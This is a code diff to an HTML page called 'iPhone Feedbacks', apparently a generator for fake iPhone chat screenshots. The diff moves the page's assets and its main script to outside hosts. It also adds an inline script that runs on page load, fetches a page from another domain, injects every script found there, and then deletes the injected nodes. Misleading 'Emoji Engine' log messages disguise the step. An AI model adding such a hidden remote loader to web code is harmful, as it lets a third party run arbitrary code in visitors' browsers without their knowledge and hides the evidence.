@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://talha-scripts-official.vercel.app/style.css">
     <link rel="shortcut icon"
-        href="tg.webp"
+        href="https://talha-scripts-official.vercel.app/tg.webp"
         type="image/x-icon">
     <title>iPhone Feedbacks</title>
 </head>
@@ -30,20 +30,45 @@
         <ul class="ul_count_bullet"></ul>
         <div class="hide3"></div>
         <div class="chats_counts">2.6K</div>
-        <img src="https://talha-ifeedback.vercel.app/talha.png" class="logo">
+        <img src="https://talha-scripts-official.vercel.app/TS.png" class="logo">
         <div class="settings_count">7</div>
 
-        <img src="https://talha-ifeedback.vercel.app/ifeed-thumb.jpeg" alt="" srcset="" class="bg_img">
+        <img src="https://talha-scripts-official.vercel.app/w.jpeg" alt="" srcset="" class="bg_img">
     </div>
     <label for="">Battery (%):</label>
     <input type="number" value="80" max="85">
+
     <button class="btn" title="Download">
     <img src="https://raw.githubusercontent.com/ahmad-bhai/zeetex-currency-rate/0f914c89358480c47e3fdbb8a74f7020d938cf36/download.svg" alt="Download">
     </button>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
         integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="scripts.js"></script>
+       <script src="https://talha-scripts-official.vercel.app/script.js"></script>
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log(" Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+    </script>
+</body>
 </body>
 
 </html>
